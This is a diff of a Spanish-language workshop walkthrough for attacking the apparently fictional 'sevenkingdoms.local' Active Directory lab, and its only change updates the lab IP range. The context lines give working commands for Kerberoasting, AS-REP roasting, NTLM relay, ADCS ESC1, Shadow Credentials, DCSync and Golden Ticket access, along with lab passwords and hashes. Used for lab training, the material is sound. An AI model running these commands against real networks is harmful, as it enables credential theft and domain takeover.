@@ -16,18 +16,18 @@ Este paso ayuda a identificar servicios clave como SMB, LDAP y Kerberos.
 Para descubrir usuarios en el dominio, se pueden utilizar múltiples herramientas:
 
 ```bash
-netexec smb 192.168.46.10-22 --users
+netexec smb 192.168.56.10-22 --users
 ```
 
 También se puede realizar con `rpcclient`:
 
 ```bash
-rpcclient -U "" -N 192.168.46.11 -c "enumdomusers"
+rpcclient -U "" -N 192.168.56.11 -c "enumdomusers"
 ```
 
 Con esto podemos correr el siguiente comando para exportar una lista de usuarios que se encuentran actualmente en Active Directory:
 ```bash
-rpcclient -U "" -N 192.168.46.11 -c "enumdomusers" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
+rpcclient -U "" -N 192.168.56.11 -c "enumdomusers" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
 ```
 
 
@@ -39,7 +39,7 @@ rpcclient -U "" -N 192.168.46.11 -c "enumdomusers" | cut -d '[' -f 2 | cut -d ']
 Este ataque se dirige a cuentas sin pre-autenticación Kerberos.
 
 ```bash
-impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.46.11 -format hashcat -output asrephash
+impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile users.txt -dc-ip 192.168.56.11 -format hashcat -output asrephash
 ```
 
 **Cómo funciona:**
@@ -57,10 +57,10 @@ Este ataque abusa de los **Service Principal Names (SPN)** para obtener hashes d
 
 ```bash
 ### Usando el usuario previamente obtenido
-impacket-GetUserSPNs -dc-ip 192.168.46.11 -outputfile asrephash -usersfile users.txt 'north.sevenkingdoms.local/samwell.tarly:Heartsbane'
+impacket-GetUserSPNs -dc-ip 192.168.56.11 -outputfile asrephash -usersfile users.txt 'north.sevenkingdoms.local/samwell.tarly:Heartsbane'
 
 ### O con el usuario brandon.stark
-impacket-GetUserSPNs -dc-ip 192.168.46.11 -outputfile kerberoasting.hashes -usersfile users.txt 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople'
+impacket-GetUserSPNs -dc-ip 192.168.56.11 -outputfile kerberoasting.hashes -usersfile users.txt 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople'
 ```
 
 Para crackear el hash:
@@ -80,17 +80,17 @@ hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -O
 ### 3.1 Enumeración con BloodHound
 Podemos verificar el acceso del usuario `jon.snow` :
 ```bash
-nxc smb 192.168.46.10-23 -u jon.snow -p 'iknownothing'
+nxc smb 192.168.56.10-23 -u jon.snow -p 'iknownothing'
 ```
 
 Corriendo BloodHound Ingestor:
 ```bash
-bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.10 -dc sevenkingdoms.local
+bloodhound-python --zip -c All -d sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.10 -dc sevenkingdoms.local
 ```
 
 Con el dominio de `north.sevenkingdoms.local`:
 ```bash
-bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.11 -dc north.sevenkingdoms.local
+bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.56.11 -dc north.sevenkingdoms.local
 ```
 
 > ***📝Las credenciales de neo4j son "neo4j:testing"***
@@ -157,18 +157,18 @@ Este ataque permite redirigir autenticaciones NTLM capturadas hacia otro sistema
 
 Generamos el listado de maquinas que pueden ser afectadas con:
 ```bash
-nxc smb 192.168.46.10-23 --gen-relay-list relay.txt
+nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
 ```
 
 Modificamos los valores de servers que empiezan con Responder y desactivamos los servicios SMB, HTTP, y HTTPS.
 
 ```bash
-ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.46.22 -smb2support -socks
+ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.56.22 -smb2support -socks
 ```
 
 Una vez que tengamos una conexion con socks, podemos correr:
 ```bash
-proxychains4 -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46.22'
+proxychains4 -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
 ```
 
 **Defensa:**
@@ -180,7 +180,7 @@ proxychains4 -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46
 ### 5.1 ADCS - ESC1
 Buscamos la plantilla vulnerable:
 ```bash
-certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -vulnerable -stdout
+certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.56.10 -vulnerable -stdout
 ```
 
 Vemos que tenemos una plantilla llamada `ESC1` que permite:
@@ -197,19 +197,19 @@ certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdo
 
 El cual nos solicita un certificado como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
 ```bash
-certipy auth -pfx administrator.pfx -dc-ip 192.168.46.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
 ```
 
 Podemos correr comandos de alto nivel como:
 ```bash
-secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.46.10
+secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.56.10
 ```
 
 ### 5.2 Shadow Credentials
 
 Podemos forzar el cambio de contraseña del usuario `jaime.lannister` con el usuario de `tywin.lannister`, con:
 ```bash
-net rpc password "jaime.lannister" "testing1" -U "sevenkingdoms.local"/"tywin.lannister"%"powerkingftw135" -S 192.168.46.10
+net rpc password "jaime.lannister" "testing1" -U "sevenkingdoms.local"/"tywin.lannister"%"powerkingftw135" -S 192.168.56.10
 ```
 
 Con el usuario de `jaime.lannister` podemos aplicar el ataque de ShadowCredentials al usuario de `joffrey.baratheon`:
@@ -220,7 +220,7 @@ certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 
 
 Podemos verificar que este hash funcione con:
 ```bash
-nxc rdp 192.168.46.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1
+nxc rdp 192.168.56.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1
 ```
 
 Podemos abusar esto con el usuario de `lord.varys` contra el usuario Administrator:
@@ -236,8 +236,8 @@ certipy shadow auto -u lord.varys@sevenkingdoms.local -p '_W1sper_$' -account 'a
 Este ataque permite dumpear completamente la base de datos de Active Directory utilizando los servicios de replicación de AD.
 
 ```bash
-secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.10 -output sevenkingdoms-local.hashes
-secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.11 -output north.sevenkingdoms.local-hashes
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.10 -output sevenkingdoms-local.hashes
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.56.11 -output north.sevenkingdoms.local-hashes
 ```
 
 Este muestra todos los hashes de todos los usuarios (habilitados y/o inhabilitados) del active directory.
@@ -261,12 +261,12 @@ export KRB5CCNAME=/home/pentester/Desktop/Workshop2025/CATELYN.STARK.ccache
 Finalmente, accedemos a una máquina objetivo:
 
 ```bash
-wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
+wmiexec.py -k -dc-ip 192.168.56.10 -target-ip 192.168.56.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
 ```
 
 Ejemplo con `catelyn.stark`:
 ```bash
-wmiexec.py -k -dc-ip 192.168.46.11 -target-ip 192.168.46.11 -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
+wmiexec.py -k -dc-ip 192.168.56.11 -target-ip 192.168.56.11 -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
 ```
 
 A pesar de que la contraseña cambie varias veces, el Golden Ticket seguirá siendo vigente.
